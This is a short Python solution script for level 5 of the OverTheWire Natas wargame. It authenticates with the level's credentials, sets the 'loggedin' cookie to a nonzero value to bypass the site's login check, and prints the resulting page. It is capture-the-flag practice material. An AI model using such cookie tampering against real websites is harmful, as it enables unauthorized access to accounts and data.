import requests
import base64

from requests.sessions import session
url= "http://natas5.natas.labs.overthewire.org"

info= base64.b64encode(b'natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq').decode("utf-8")

s= requests.Session()
s.auth=('natas5','iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
r= s.get(url)
#Here
jar= requests.cookies.RequestsCookieJar()
s.cookies.set('loggedin','5')
s.cookies.set('loggedin','5',domain=url,path='/')
r= s.get(url)
print(r.text)
#Aiming for the challenge is authenticate through the cookie 'loggedin' which can 
# access through changing from 0 to other number != 0.